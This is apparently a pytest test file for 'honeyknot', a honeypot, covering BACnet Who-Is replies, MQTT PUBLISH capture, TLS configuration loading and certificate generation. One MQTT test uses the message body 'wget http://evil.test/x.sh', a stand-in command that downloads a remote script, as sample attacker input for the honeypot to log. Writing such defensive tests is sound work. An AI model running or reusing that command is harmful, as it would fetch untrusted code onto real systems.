"""Tests for batch-5 handler changes: BACnet, MQTT PUBLISH, gencert, TLS."""

from __future__ import annotations

import asyncio
import logging
import subprocess
from unittest.mock import patch

import pytest

from honeyknot import gencert
from honeyknot.config import ServiceConfig, load_handler
from honeyknot.protocols import BACnetHandler, ConnectionContext, DatagramContext, MQTTHandler


class _FakeWriter:
    def __init__(self):
        self.buffer = bytearray()
        self._closing = False

    def is_closing(self):
        return self._closing

    def write(self, data: bytes):
        self.buffer.extend(data)

    async def drain(self):
        return None

    def close(self):
        self._closing = True

    async def wait_closed(self):
        return None


class _FakeTransport:
    def __init__(self):
        self.sent: list[tuple[bytes, tuple]] = []

    def sendto(self, data: bytes, addr: tuple) -> None:
        self.sent.append((data, addr))

    def is_closing(self):
        return False

    def close(self):
        pass


def _tcp_ctx():
    w = _FakeWriter()
    events: list = []
    ctx = ConnectionContext(
        writer=w, addr=("127.0.0.1", 54321), port=0,
        request_logger=logging.getLogger("test.req"), raw_capture=None,
        emit_event=lambda n, **f: events.append((n, f)),
    )
    return ctx, w, events


def _udp_ctx():
    t = _FakeTransport()
    events: list = []
    ctx = DatagramContext(
        transport=t, addr=("192.0.2.1", 47808), port=0,
        request_logger=logging.getLogger("test.req"),
        emit_event=lambda n, **f: events.append((n, f)),
    )
    return ctx, t, events


def _run(coro):
    return asyncio.run(coro)


# ---------- BACnet ----------
class TestBACnet:
    @staticmethod
    def _whois_frame():
        # BVLC: type=0x81, function=OrigBroadcast(0x0B), length=8
        # (length includes the 4-byte BVLC header)
        # NPDU: version=1, control=0
        # APDU: unconfirmed(0x10), service=Who-Is(0x08)
        return bytes([0x81, 0x0B, 0x00, 0x08,
                      0x01, 0x00,
                      0x10, 0x08])

    def test_who_is_gets_i_am(self):
        ctx, transport, events = _udp_ctx()
        handler = BACnetHandler(ServiceConfig(
            port=0, service_type="tcp", protocol="bacnet", transport="udp",
            protocol_opts={"device_instance": 42, "vendor_id": 123},
        ))
        _run(handler.on_datagram(self._whois_frame(), ctx))

        assert len(transport.sent) == 1
        reply, _ = transport.sent[0]
        assert reply[:2] == b"\x81\x0A"  # Original-Unicast reply
        # APDU I-Am: unconfirmed type + service 0x00
        # Find the APDU by walking past BVLC(4) + NPDU(2)
        apdu = reply[6:]
        assert apdu[0] == 0x10  # unconfirmed request
        assert apdu[1] == 0x00  # I-Am service
        # Object identifier bytes follow 0xC4 tag; low-22 bits are the instance.
        assert apdu[2] == 0xC4
        object_id = int.from_bytes(apdu[3:7], "big")
        assert object_id & 0x3FFFFF == 42

        bacnet_events = [e for e in events
                         if e[0] == "bacnet_request"
                         and e[1].get("service") == "Who-Is"]
        assert len(bacnet_events) == 1

    def test_non_bacnet_ignored(self):
        ctx, transport, _ = _udp_ctx()
        handler = BACnetHandler(ServiceConfig(
            port=0, service_type="tcp", protocol="bacnet", transport="udp",
        ))
        _run(handler.on_datagram(b"\x00\x00\x00\x00", ctx))
        assert transport.sent == []

    def test_reply_is_bounded(self):
        """BACnet/IP isn't typically Internet-exposed for amplification,
        but the reply should still be small (well under an MTU)."""
        ctx, transport, _ = _udp_ctx()
        handler = BACnetHandler(ServiceConfig(
            port=0, service_type="tcp", protocol="bacnet", transport="udp",
        ))
        _run(handler.on_datagram(self._whois_frame(), ctx))
        reply = transport.sent[0][0]
        assert len(reply) < 40


# ---------- MQTT PUBLISH ----------
class TestMQTTPublish:
    @staticmethod
    def _encode_varint(n):
        out = bytearray()
        while True:
            byte = n & 0x7F
            n >>= 7
            if n:
                out.append(byte | 0x80)
            else:
                out.append(byte)
                break
        return bytes(out)

    def test_qos0_publish_captures_body(self):
        ctx, writer, events = _tcp_ctx()
        handler = MQTTHandler(ServiceConfig(
            port=0, service_type="tcp", protocol="mqtt",
        ))
        topic = b"iot/device/cmd"
        body = b"wget http://evil.test/x.sh"
        payload = (len(topic).to_bytes(2, "big") + topic + body)
        # type=3, flags=0 (QoS 0)
        packet = bytes([3 << 4]) + self._encode_varint(len(payload)) + payload
        _run(handler.on_data(packet, ctx))

        pub_events = [e for e in events if e[0] == "mqtt_publish"]
        assert pub_events
        evt = pub_events[0][1]
        assert evt["topic"] == "iot/device/cmd"
        assert evt["qos"] == 0
        assert evt["body_bytes"] == len(body)
        assert evt["body"] == body

    def test_qos1_publish_gets_puback(self):
        ctx, writer, events = _tcp_ctx()
        handler = MQTTHandler(ServiceConfig(
            port=0, service_type="tcp", protocol="mqtt",
        ))
        topic = b"t"
        pkt_id = 0x1234
        body = b"hi"
        payload = (len(topic).to_bytes(2, "big") + topic
                   + pkt_id.to_bytes(2, "big") + body)
        # type=3, flags=0x02 (QoS 1)
        first = (3 << 4) | 0x02
        packet = bytes([first]) + self._encode_varint(len(payload)) + payload
        _run(handler.on_data(packet, ctx))
        # PUBACK: 0x40, 0x02, <id hi>, <id lo>
        assert bytes(writer.buffer[:4]) == bytes([0x40, 0x02, 0x12, 0x34])


# ---------- Generic TLS in config ----------
class TestTLSConfig:
    def test_legacy_https_sets_tls_enabled(self, tmp_path):
        f = tmp_path / "x.toml"
        f.write_text(
            '[service]\n'
            'port = 443\n'
            'type = "https"\n'
            'protocol = "http"\n'
            '[tls]\n'
            'certfile = "/tmp/c"\n'
            'keyfile = "/tmp/k"\n'
        )
        cfg = load_handler(f)
        assert cfg.tls_enabled is True
        assert cfg.tls_certfile == "/tmp/c"

    def test_tls_enabled_true_on_any_tcp(self, tmp_path):
        f = tmp_path / "x.toml"
        f.write_text(
            '[service]\n'
            'port = 993\n'
            'protocol = "imap"\n'
            '[tls]\n'
            'enabled = true\n'
            'certfile = "c.pem"\n'
            'keyfile = "k.pem"\n'
        )
        cfg = load_handler(f)
        assert cfg.tls_enabled is True
        assert cfg.protocol == "imap"

    def test_certfile_keyfile_alone_enables_tls(self, tmp_path):
        f = tmp_path / "x.toml"
        f.write_text(
            '[service]\n'
            'port = 465\n'
            'protocol = "smtp"\n'
            '[tls]\n'
            'certfile = "c.pem"\n'
            'keyfile = "k.pem"\n'
        )
        cfg = load_handler(f)
        assert cfg.tls_enabled is True

    def test_no_tls_section_leaves_disabled(self, tmp_path):
        f = tmp_path / "x.toml"
        f.write_text(
            '[service]\n'
            'port = 143\n'
            'protocol = "imap"\n'
        )
        cfg = load_handler(f)
        assert cfg.tls_enabled is False

    def test_explicit_disabled(self, tmp_path):
        f = tmp_path / "x.toml"
        f.write_text(
            '[service]\n'
            'port = 465\n'
            'protocol = "smtp"\n'
            '[tls]\n'
            'enabled = false\n'
            'certfile = "c.pem"\n'
            'keyfile = "k.pem"\n'
        )
        cfg = load_handler(f)
        assert cfg.tls_enabled is False


# ---------- Gencert ----------
class TestGencert:
    def test_missing_openssl_errors(self, tmp_path, monkeypatch):
        monkeypatch.setattr("shutil.which", lambda _: None)
        with pytest.raises(RuntimeError, match="openssl not found"):
            gencert.generate(tmp_path / "out")

    def test_calls_openssl_with_expected_args(self, tmp_path):
        out = tmp_path / "certs"
        called_args = {}

        def fake_run(args, *, check, capture_output):
            called_args["args"] = args
            # Create the files openssl would have produced
            out.mkdir(parents=True, exist_ok=True)
            (out / "tls.cert").write_text("CERT")
            (out / "tls.key").write_text("KEY")
            return subprocess.CompletedProcess(args=args, returncode=0)

        with (
            patch.object(gencert.shutil, "which", return_value="/usr/bin/openssl"),
            patch.object(gencert.subprocess, "run", side_effect=fake_run),
        ):
            cert, key = gencert.generate(out, cn="x.test", days=7)

        assert cert == out / "tls.cert"
        assert key == out / "tls.key"
        assert "-keyout" in called_args["args"]
        assert "/CN=x.test" in called_args["args"]
        assert "7" in called_args["args"]

    def test_main_returns_1_on_missing_openssl(self, tmp_path, monkeypatch, capsys):
        monkeypatch.setattr("shutil.which", lambda _: None)
        rc = gencert.main(["--out", str(tmp_path / "certs")])
        assert rc == 1
        err = capsys.readouterr().err
        assert "openssl not found" in err

    def test_main_surfaces_openssl_failure(self, tmp_path, monkeypatch, capsys):
        monkeypatch.setattr("shutil.which", lambda _: "/usr/bin/openssl")

        def boom(args, *, check, capture_output):
            raise subprocess.CalledProcessError(
                returncode=1, cmd=args, stderr=b"bad stuff",
            )

        monkeypatch.setattr(gencert.subprocess, "run", boom)
        rc = gencert.main(["--out", str(tmp_path / "certs")])
        assert rc == 1
        err = capsys.readouterr().err
        assert "openssl failed" in err
        assert "bad stuff" in err


# ---------- Config signature includes tls_enabled ----------
class TestConfigSignatureTls:
    def test_reload_detects_tls_flip(self):
        from honeyknot.server import _config_signature
        a = ServiceConfig(port=993, service_type="tcp", protocol="imap",
                          tls_enabled=False)
        b = ServiceConfig(port=993, service_type="tcp", protocol="imap",
                          tls_enabled=True)
        assert _config_signature(a) != _config_signature(b)


if __name__ == "__main__":
    pytest.main([__file__, "-v"])
